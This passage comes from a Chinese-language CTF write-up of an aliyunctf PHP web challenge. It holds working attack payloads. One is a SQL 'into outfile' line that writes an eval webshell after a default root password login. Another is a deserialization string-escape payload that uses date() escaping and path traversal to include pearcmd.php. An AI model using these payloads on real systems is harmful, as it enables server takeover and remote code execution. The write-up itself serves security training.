+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$cachefile</span> <span class="o">=</span> <span class="s1">&#39;/var/www/html/cache/&#39;</span> <span class="o">.</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;-&#39;</span><span class="o">.</span><span class="nx">date</span><span class="p">(</span><span class="s2">&#34;Y-m-d&#34;</span><span class="p">)</span><span class="o">.</span> <span class="s1">&#39;.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">is_file</span><span class="p">(</span><span class="nv">$cachefile</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$data</span><span class="o">=</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$cachefile</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$checkdata</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;&lt;?php exit;//&#34;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$data</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$check</span><span class="o">=</span><span class="s2">&#34;/var/www/html/&#34;</span><span class="o">.</span><span class="nv">$checkdata</span><span class="p">[</span><span class="s1">&#39;background&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;.php&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">include</span> <span class="s2">&#34;</span><span class="si">$check</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里其实就是将插入的<code>&lt;?php exit;//</code>替换为空，然后反序列化，就是反序列化为数组，然后读取数组中的内容，再包含它。从前面的序列化的代码可以看出，这里就是包含ok.php的内容，访问没有东西，还是直接看源码，得到如下内容：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">echo</span> <span class="s1">&#39;ok&#39;</span><span class="p">;</span><span class="cp">?&gt;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">//adminer_481.php
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>访问就是mysql的连接操作：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202502231657381.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250223165707330"
+	
+	
+></p>
+<p>有点类似数据库操作的内容，但是这里就没获取到源码：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202502231641056.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250223164157011"
+	
+	
+></p>
+<p>在login.php文件中可以看到数据库名以及密码等信息，直接登录看看：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202502231645719.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250223164524667"
+	
+	
+></p>
+<p>可以查看数据库文件，以及可以执行sql语句。也尝试了into outfile和日志写马，但是都没有成功。应该是没有权限。</p>
+<p>再看index.php代码，在<code>isset($_POST['reason'])</code>的代码块中，这个time似乎是可控的：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;reason&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;debug_buka&#39;</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$time</span><span class="o">=</span><span class="nx">date</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;debug_buka&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$time</span><span class="o">=</span><span class="nx">date</span><span class="p">(</span><span class="s2">&#34;Y-m-d H:i:s&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$arraya</span><span class="o">=</span><span class="nx">serialize</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">&#34;name&#34;</span><span class="o">=&gt;</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">],</span><span class="s2">&#34;reason&#34;</span><span class="o">=&gt;</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;reason&#39;</span><span class="p">],</span><span class="s2">&#34;time&#34;</span><span class="o">=&gt;</span><span class="nv">$time</span><span class="p">,</span><span class="s2">&#34;background&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;ok&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$check</span><span class="o">-&gt;</span><span class="na">writec</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;-&#39;</span><span class="o">.</span><span class="nx">date</span><span class="p">(</span><span class="s2">&#34;Y-m-d&#34;</span><span class="p">),</span><span class="nv">$arraya</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>那么是否可以打字符串逃逸呢，直接控制time的值为<code>&lt;?php exit;//</code>的一部分，然后被替换为空，并且这里的<code>reason</code>变量也是可控的，这样的话就是打字符串逃逸（减少），然后包含其他文件，测试一下data函数的输出：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="mi">111</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">=</span><span class="s2">&#34;&lt;?php exit;//&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">date</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">date</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//output:
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">111</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">Z08Z</span> <span class="nx">UTC20255228</span><span class="p">;</span><span class="c1">//
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>不可控，打不了，<code>date()</code>函数会。</p>
+<p>还是需要打其他的方法。</p>
+<p>尝试一下root的一般的默认密码root，直接登进去了：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202502231715863.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250223171557807"
+	
+	
+></p>
+<p>成功执行命令：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202502231716496.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250223171630446"
+	
+	
+></p>
+<p>尝试写马：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">select</span> <span class="s1">&#39;&lt;?php echo 123; @eval($_POST[123]); ?&gt;&#39;</span> <span class="n">into</span> <span class="n">outfile</span> <span class="s1">&#39;/var/www/html/shell.php&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>成功执行:</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202502231724504.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250223172421455"
+	
+	
+></p>
+<p>访问1.php，成功执行：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202502231725289.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250223172553236"
+	
+	
+></p>
+<p>得到flag:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">aliyunctf{a9d1e1d9-53d5-4d10-a96b-361d693fb502} 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>——————</p>
+<p>最后看了一下官方wp。上面的是当时打出来的非预期解法。下面来简单说说预期解是反序列化字符串逃逸打pearcmd文件包含，主要还是这里的date()函数的绕过，在前面的php测试代码中，可以看出来是有字母或其他符号，会杯输出为其他内容。但是<strong>这里可以使用反斜杠来绕过</strong>，测试代码如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="mi">111</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">=</span><span class="s2">&#34;\&lt;\?\p\h\p\ </span><span class="se">\\</span><span class="s2">e\x\i</span><span class="se">\\</span><span class="s2">t\;\/\/&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">date</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">date</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cm">/*output:
+</span></span></span><span class="line"><span class="cl"><span class="cm">111
+</span></span></span><span class="line"><span class="cl"><span class="cm">&lt;?php exit;//
+</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>由于php的特性，这里的<code>\e</code>和<code>\t</code>是一个特殊字符，所以多拿一个<code>\</code>来将前面的给转义，让其不被解析为特殊字符。</p>
+<p>从输出结果可以看出来成功输出想要的内容。再加上前面说的time变量是可控的，再加上<code>reason</code>变量可控，这里尝试如下包含pearcmd文件内容，简单来构造一下：</p>
+<p>正常的内容大概如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">exit</span><span class="p">;</span><span class="c1">//a:4:{s:4:&#34;name&#34;;s:6:&#34;fupanc&#34;;s:6:&#34;reason&#34;;s:3:&#34;123&#34;;s:4:&#34;time&#34;;s:5:&#34;11112&#34;;s:10:&#34;background&#34;;s:2:&#34;ok&#34;;}
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后会将<code>&lt;?php exit;//</code>替换为空，这里看一下怎么利用。基本思路就是将background里面对应的<code>ok</code>给删去，替换为pearcmd内容。</p>
+<p>看了一下，感觉这里是需要结合当时字符串增多的特性来使用的，就是反序列化时匹配到足够的字符，然后就不会再匹配后面的字符了,这里需要将<code>&quot;;s:4:&quot;time&quot;;s:5:&quot;</code>吞掉，然后马上将time的值给设置给指定的值，在吞掉结束后，马上匹配一个<code>&quot;+后续字符</code>来构成一个完整的序列化字符串，然后这里的长度匹配如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="s1">&#39;&#34;;s:4:&#34;time&#34;;s:5:&#34;xxxxxxxx&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">a</span><span class="o">=</span><span class="s1">&#39;&#34;;s:10:&#34;background&#34;;s:7:&#34;pearcmd&#34;;}&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="s1">&#39;&lt;?php exit;//&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="o">//</span><span class="n">output</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="mi">18</span>
+</span></span><span class="line"><span class="cl"><span class="mi">13</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>需要改成长度匹配，而整数倍，这里只能修改字符串长度，所以让如下即可：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="s1">&#39;&#34;;s:4:&#34;time&#34;;s:5:&#34;xxxxxxxx&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">a</span><span class="o">=</span><span class="s1">&#39;&#34;;s:10:&#34;background&#34;;s:7:&#34;pearcmd&#34;;}&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="s1">&#39;&lt;?php exit;//&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="o">//</span><span class="n">output</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="mi">26</span>
+</span></span><span class="line"><span class="cl"><span class="mi">13</span>    
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>传参就如下传即可：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">xxxxxxxx</span><span class="s2">&#34;;s:4:&#34;</span><span class="nx">time</span><span class="s2">&#34;;s:5:&#34;</span><span class="mi">11112</span><span class="s2">&#34;;s:10:&#34;</span><span class="nx">background</span><span class="s2">&#34;;s:7:&#34;</span><span class="nx">pearcmd</span><span class="s2">&#34;;}
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>看看输出：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$arraya</span><span class="o">=</span><span class="nx">serialize</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">&#34;name&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;fupanc&#34;</span><span class="p">,</span><span class="s2">&#34;reason&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;&lt;?php exit;//&lt;?php exit;//&#34;</span><span class="p">,</span><span class="s2">&#34;time&#34;</span><span class="o">=&gt;</span><span class="s1">&#39;xxxxxxxx&#34;;s:4:&#34;time&#34;;s:5:&#34;11112&#34;;s:10:&#34;background&#34;;s:7:&#34;pearcmd&#34;;}&#39;</span><span class="p">,</span><span class="s2">&#34;background&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;ok&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$name</span><span class="o">=</span><span class="s2">&#34;fupanc&#34;</span><span class="o">.</span><span class="s1">&#39;-&#39;</span><span class="o">.</span><span class="nx">date</span><span class="p">(</span><span class="s2">&#34;Y-m-d&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$file</span> <span class="o">=</span> <span class="nv">$name</span> <span class="o">.</span> <span class="s1">&#39;.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$cachedata</span> <span class="o">=</span> <span class="s2">&#34;&lt;?php exit;//&#34;</span> <span class="o">.</span> <span class="nv">$arraya</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="nv">$cachedata</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$data</span><span class="o">=</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;&lt;?php exit;//&#34;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$b</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//output:
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">a</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">&#34;name&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">6</span><span class="o">:</span><span class="s2">&#34;fupanc&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">6</span><span class="o">:</span><span class="s2">&#34;reason&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">26</span><span class="o">:</span><span class="s2">&#34;&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">&#34;time&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">66</span><span class="o">:</span><span class="s2">&#34;xxxxxxxx&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">&#34;time&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="s2">&#34;11112&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">10</span><span class="o">:</span><span class="s2">&#34;background&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">7</span><span class="o">:</span><span class="s2">&#34;pearcmd&#34;</span><span class="p">;}</span><span class="s2">&#34;;s:10:&#34;</span><span class="nx">background</span><span class="s2">&#34;;s:2:&#34;</span><span class="nx">ok</span><span class="s2">&#34;;}
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>在反序列化尝试时运行报错，再看，发现是长度出了问题，这里的time的长度为66，但是我原先测试的时候是设置为了一个长度为5的值，所以这里需要改一下长度，减少一个x即可，最后尝试如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$arraya</span><span class="o">=</span><span class="nx">serialize</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">&#34;name&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;fupanc&#34;</span><span class="p">,</span><span class="s2">&#34;reason&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;&lt;?php exit;//&lt;?php exit;//&#34;</span><span class="p">,</span><span class="s2">&#34;time&#34;</span><span class="o">=&gt;</span><span class="s1">&#39;xxxxxxx&#34;;s:4:&#34;time&#34;;s:5:&#34;11112&#34;;s:10:&#34;background&#34;;s:7:&#34;pearcmd&#34;;}&#39;</span><span class="p">,</span><span class="s2">&#34;background&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;ok&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$name</span><span class="o">=</span><span class="s2">&#34;fupanc&#34;</span><span class="o">.</span><span class="s1">&#39;-&#39;</span><span class="o">.</span><span class="nx">date</span><span class="p">(</span><span class="s2">&#34;Y-m-d&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$file</span> <span class="o">=</span> <span class="nv">$name</span> <span class="o">.</span> <span class="s1">&#39;.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$cachedata</span> <span class="o">=</span> <span class="s2">&#34;&lt;?php exit;//&#34;</span> <span class="o">.</span> <span class="nv">$arraya</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="nv">$cachedata</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$data</span><span class="o">=</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$checkdata</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;&lt;?php exit;//&#34;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$data</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$checkdata</span><span class="p">[</span><span class="s1">&#39;background&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;.php&#34;</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>输出为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pearcmd.php
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>成功了！，那么就可以打了，但是需要注意一下文件包含的路径，由于代码逻辑拼接了路径，所以需要进行目录穿越，最后的payload如下:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$arraya</span><span class="o">=</span><span class="nx">serialize</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">&#34;name&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;fupanc&#34;</span><span class="p">,</span><span class="s2">&#34;reason&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;&lt;?php exit;//&lt;?php exit;//&#34;</span><span class="p">,</span><span class="s2">&#34;time&#34;</span><span class="o">=&gt;</span><span class="s1">&#39;xxxxxxx&#34;;s:4:&#34;time&#34;;s:5:&#34;11112&#34;;s:10:&#34;background&#34;;s:37:&#34;../../../../usr/local/lib/php/pearcmd&#34;;}&#39;</span><span class="p">,</span><span class="s2">&#34;background&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;ok&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$name</span><span class="o">=</span><span class="s2">&#34;fupanc&#34;</span><span class="o">.</span><span class="s1">&#39;-&#39;</span><span class="o">.</span><span class="nx">date</span><span class="p">(</span><span class="s2">&#34;Y-m-d&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$file</span> <span class="o">=</span> <span class="nv">$name</span> <span class="o">.</span> <span class="s1">&#39;.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$cachedata</span> <span class="o">=</span> <span class="s2">&#34;&lt;?php exit;//&#34;</span> <span class="o">.</span> <span class="nv">$arraya</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="nv">$cachedata</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$data</span><span class="o">=</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$checkdata</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;&lt;?php exit;//&#34;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$data</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$checkdata</span><span class="p">[</span><span class="s1">&#39;background&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;.php&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//output:
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">../../../../</span><span class="nx">usr</span><span class="o">/</span><span class="nx">local</span><span class="o">/</span><span class="nx">lib</span><span class="o">/</span><span class="nx">php</span><span class="o">/</span><span class="nx">pearcmd</span><span class="o">.</span><span class="nx">php</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>再简单进行一下预期解的做法：</p>
+<p>在login.php文件内容中可以看到登录以及存入数据库的逻辑，并且是直接写入web数据库的，直接连接即可，然后自己写一个就行了：</p>
+<div class="highlight"><div class="chroma">
